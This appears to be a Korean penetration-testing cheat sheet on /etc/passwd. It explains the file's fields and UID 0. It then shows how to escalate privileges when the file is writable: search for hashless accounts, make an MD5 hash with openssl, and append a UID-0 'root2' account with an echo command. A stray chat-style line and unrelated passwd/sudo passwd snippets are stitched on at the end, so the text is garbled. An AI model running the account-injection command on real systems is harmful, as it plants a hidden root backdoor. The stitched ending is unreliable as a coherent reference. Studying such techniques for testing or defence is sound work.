# /etc/passwd 분석

> 무엇: /etc/passwd의 7필드 구조(username:password:UID:GID:GECOS:home_dir:shell)와 UID 0 판별, 쓰기 가능할 때 openssl passwd -1 해시로 root 계정을 추가하는 기법을 정리한 문서
> 언제: 초기 열거에서 계정·셸 목록을 파악할 때 기본으로 읽고, /etc/passwd에 쓰기 권한이 잡히면 즉시 권한 상승 벡터로 전환한다
> 조건: 읽기는 전 사용자에게 개방돼 있고, 계정 추가 악용에는 파일 쓰기 권한과 openssl 해시 생성이 필요하다. grep -v ':x:'로 해시 없는 계정을 찾는다

## 구조

```
username:password:UID:GID:GECOS:home_dir:shell
```

- `username`: 로그인 계정명
- `password`: 'x' 표시는 /etc/shadow에 암호 저장됨
- `UID`: 사용자 ID (0=root, <1000=시스템 계정, ≥1000=일반 사용자)
- `GID`: 기본 그룹 ID
- `GECOS`: 사용자 정보 필드(이름, 연락처 등)
- `home_dir`: 홈 디렉토리 경로
- `shell`: 로그인 시 실행되는 기본 쉘

## 주요 계정 식별

```
root:x:0:0:root:/root:/bin/bash    # 관리자 계정
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin    # 최소 권한 계정
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin    # 웹 서버 계정
```

## 취약점 활용

- 쓰기 가능한 /etc/passwd 확인: `ls -la /etc/passwd`
- 해시 없는 계정 검색: `grep -v ':x:' /etc/passwd`
- OpenSSL로 암호 생성: `openssl passwd -1 -salt xyz password`
- 루트 계정 추가: `echo 'root2:$1$xyz$kL.GVc1d6R.Fw5SYW1tD//:0:0:root:/root:/bin/bash' >> /etc/passwd`

오케이, 깔끔하게 요약해줄게. 핵심만 뽑자.

---

```bash
# 내 비밀번호 변경 -> 현재 비밀번호를 알고 있는 경우
passwd
```

```bash
# 루트가 다른 유저 비번 바꾸고 싶을 때:
sudo passwd [사용자이름]
```
